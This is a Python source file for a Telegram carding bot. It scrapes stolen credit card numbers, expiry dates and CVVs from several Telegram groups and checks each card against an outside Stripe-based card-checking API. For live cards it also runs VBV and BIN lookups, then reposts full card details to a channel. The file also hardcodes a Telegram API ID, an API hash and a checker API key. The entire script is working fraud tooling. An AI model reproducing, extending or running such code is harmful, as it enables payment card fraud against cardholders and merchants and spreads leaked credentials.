import re
import asyncio
import httpx
import random
import time
from telethon import TelegramClient, events

# Telegram Config
api_id = 22092598
api_hash = "93de73c78293c85fd6feddb92f91b81a"
session_name = "cc_scraper"

group_ids = [-1002410570317, -1001878543352, -1001894182976]
channel_id = -1002046472570

client = TelegramClient(session_name, api_id, api_hash)

gate_names = ["Stripe Auth API"]
proxy_emojis = ["☁️", "⚡", "✨", "☀️", "🌧️", "❄️"]

cc_pattern = re.compile(r'(\d{13,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})')
API_URL = "https://barryxapi.xyz/stripe_auth"
API_KEY = "BRY-FGKD5-MDYRI-56HDM"

def format_cc(match):
    cc, mm, yy, cvv = match.groups()
    yy = yy[-2:]
    mm = mm.zfill(2)
    return f"{cc}|{mm}|{yy}|{cvv}"

async def stripe_check(cc):
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(
                API_URL,
                params={"key": API_KEY, "card": cc},
                timeout=15
            )
            data = response.json()
            return {
                "status": data.get("status", "error"),
                "message": data.get("message", "No message")
            }
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def vbv_check(cc_details):
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get("https://api.voidapi.xyz/v2/vbv", params={"card": cc_details}, timeout=10)
            return r.json().get("vbv_status", "❌ VBV Check Failed")
    except Exception as e:
        return f"❌ VBV Error: {str(e)}"

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    async with httpx.AsyncClient() as client:
        try:
            res = await client.get(url, timeout=10)
            j = res.json()
            return {
                "country": j.get("country_name", "Unknown"),
                "flag": j.get("country_flag", "🏳"),
                "bank": j.get("bank", "Unknown"),
                "type": f"{j.get('type', 'Unknown')} - {j.get('brand', 'Unknown')}"
            }
        except:
            return {"country": "Unknown", "flag": "🏳", "bank": "Unknown", "type": "Unknown"}

sent_ccs = set()

@client.on(events.NewMessage())
async def fast_scraper(event):
    if event.chat_id not in group_ids:
        return
    try:
        text = re.sub(r"[^\d\s|/-]", "", event.raw_text)
        found_ccs = {format_cc(match) for match in cc_pattern.finditer(text)}

        for cc in found_ccs:
            if cc in sent_ccs:
                print(f"[SKIPPED] Already checked: {cc}")
                continue

            sent_ccs.add(cc)
            result = await stripe_check(cc)
            print("Stripe Result:", result)

            if result["status"].lower() in ["approved", "charged", "insufficient_funds", "incorrect_cvc"]:
                start = time.time()
                vbv_status = await vbv_check(cc)
                bin_info = await get_bin_info(cc[:6])
                t = round(time.time() - start, 2)
                emoji = random.choice(proxy_emojis)
                gate = random.choice(gate_names)

                message = f"""
[ϟ] 𝗕𝗮𝗿𝗿𝘆 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 | [$scr]

𝗦𝘁𝗮𝘁𝘂𝘀 - Process Completed
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - <code>{cc}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : Approved ✅
[ϟ] 𝗚𝗮𝘁𝗲 - {gate}
━━━━━━━━━━━━━
[ϟ] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : <code>{cc[:6]}</code>
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{bin_info['country']} {bin_info['flag']}</code>
[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : <code>{bin_info['bank']}</code>
[ϟ] 𝗧𝘆𝗽𝗲 : <code>{bin_info['type']}</code>
━━━━━━━━━━━━━
[ϟ] T/t : {t}s | Proxy : None {emoji}
[ϟ] 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗱 𝗕𝘆 : <a href="https://t.me/BarryxScrapper">𝗕𝗮𝗿𝗿𝘆</a>
"""
                await client.send_message(channel_id, message, parse_mode="HTML")
            else:
                print(f"[DECLINED] {cc} | {result['message']}")

    except Exception as e:
        print(f"[ERROR] Scraper crashed: {e}")

async def run_scraper_once():
    try:
        await client.start()
        print("✅ Scraper Running...")
        await client.run_until_disconnected()
    except Exception as e:
        print(f"[ERROR] Scraper stopped: {e}")

if __name__ == "__main__":
    client.loop.run_until_complete(run_scraper_once())
